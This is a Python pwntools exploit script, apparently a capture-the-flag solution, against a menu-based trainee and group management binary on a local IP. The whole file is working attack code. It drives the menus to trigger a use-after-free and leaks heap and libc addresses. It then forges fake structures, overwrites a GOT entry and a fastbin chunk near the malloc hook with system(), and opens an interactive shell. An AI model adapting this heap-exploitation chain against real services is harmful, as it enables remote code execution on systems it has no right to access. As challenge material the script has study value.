#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "10.211.55.6"
port = 8888

r = remote(host,port)


def register(ids,pw,name):
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(ids)
    r.recvuntil(":")
    r.sendline(pw)
    r.recvuntil(":")
    r.sendline(name)

def login(ids,pw):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(ids)
    r.recvuntil(":")
    r.sendline(pw)


def game():
    r.recvuntil(">")
    r.sendline("4")


def manage(idx):
    r.recvuntil(">")
    r.sendline(str(idx))

def get_trainee(name):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil("?")
    r.sendline(name)

def traineeret():
    r.recvuntil(">")
    r.sendline("6")


def creategroup(num,name):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil("(min:3 max:12)")
    r.sendline(str(num))
    for i in range(3):
        r.recvuntil("):")
        r.sendline(str(1))
    r.recvuntil("?")
    r.sendline(name)

def managegroup(idx):
    r.recvuntil(">")
    r.sendline("4")
    r.recvuntil("manage:")
    r.sendline(str(idx))


def removemem(idx):
    r.recvuntil(">")
    r.sendline("4")
    r.recvuntil("remove:")
    r.sendline(str(idx))

def memgroupret():
    r.recvuntil(">")
    r.sendline("7")

def groupret():
    r.recvuntil(">")
    r.sendline("5")

def firetrainee(idx):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil("fire:")
    r.sendline(str(idx))

def mainret():
    r.recvuntil(">")
    r.sendline("5")

def logout():
    r.recvuntil(">")
    r.sendline("2")

def listmem():
    r.recvuntil(">")
    r.sendline("2")

def delgroup(idx):
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil("delete:")
    r.sendline(str(idx))
def changegname(name):
    r.recvuntil(">")
    r.sendline("5")
    r.recvuntil("?")
    r.sendline(name)

register("ddaa","dead","nogg")
register("fish","fish","fish")

login("ddaa","dead")
game()
manage(1)
get_trainee("a"*0x30)
get_trainee("lays")
get_trainee("jeffxx")
traineeret()
mainret()
logout()
login("fish","fish")

game()
manage(1)
get_trainee("hhw")
get_trainee("hhw")
get_trainee("hhw")
traineeret()
mainret()
logout()
login("ddaa","dead")
game()
manage(2)
creategroup(3,"mehqq")
managegroup(1)
removemem(1)
removemem(1)
removemem(1)
memgroupret()
groupret()
manage(1)
firetrainee(1)
firetrainee(1)
firetrainee(1)
get_trainee("gygy")
get_trainee("gygy")
get_trainee("gygy")
traineeret()

mainret()
logout()
login("fish","fish")
game()
manage(2)
creategroup(3,"ddaaqq")
groupret()
mainret()
logout()
login("ddaa","dead")
game()
manage(1)
firetrainee(3)
firetrainee(2)
firetrainee(1)
traineeret()
manage(2)
managegroup(1)
listmem()
r.recvuntil("#######################################")
heap = u64(r.recvuntil("Trainee")[:-7].strip().ljust(8,"\x00")) - 0x150
print hex(heap)
memgroupret()
groupret()
mainret()
logout()
login("fish","fish")
game()
manage(2)
delgroup(1)
atoi_got = 0x606fe0
fake_addr = heap+0x410
fake_traineer = p64(fake_addr) + p64(0x8) + p64(0) + p64(heap+0x250) + p64(heap+0x210) + p64(heap+0x210)

creategroup(3,fake_traineer)
groupret()
mainret()
logout()
login("ddaa","dead")
game()
manage(2)
managegroup(1)

removemem(1)
memgroupret()
groupret()


fake_addr2 = heap + 0xf0
fake_group = p64(atoi_got) + p64(8) + p64(0) + p64(0) + p64(fake_addr)*2 
manage(1)
firetrainee(1)
get_trainee(fake_group)
get_trainee("a"*0x60)
traineeret()
manage(2)
r.recvuntil(">")
r.sendline("2")
r.recvuntil("Group name: ")
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x36e80 
print hex(libc)
free_hook =libc+ 0x3c67a8
groupret()
manage(1)
firetrainee(2)
firetrainee(1)
fastbin = libc + 0x3c4b50
fake_group = p64(heap+0x4b0) + p64(0x60) + p64(0) + p64(0) + p64(fake_addr)*2 
get_trainee(fake_group)
traineeret()
manage(2)
managegroup(1)
fake_chunk = libc + 0x3c4aed
changegname(p64(fake_chunk))
memgroupret()
groupret()
manage(1)
system = libc + 0x45390
payload = "a"*11 + p64(system)
payload = payload.ljust(0x60,"\x00")
get_trainee("a"*0x60)
get_trainee(payload)
traineeret()
manage(2)
managegroup(1)
changegname("sh\x00")
r.interactive()

